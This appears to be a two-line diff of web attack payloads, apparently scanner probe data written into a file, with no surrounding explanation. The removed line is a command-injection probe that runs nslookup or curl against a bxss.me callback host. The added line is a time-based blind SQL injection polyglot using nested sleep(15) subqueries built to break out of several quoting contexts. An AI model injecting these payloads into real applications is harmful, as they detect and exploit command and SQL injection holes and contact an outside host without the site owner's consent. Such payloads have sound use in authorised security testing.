@@ -1,1 +1,1 @@
-`(nslookup -q=cname hitxwlgbyjscf39422.bxss.me||curl hitxwlgbyjscf39422.bxss.me)`
+(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
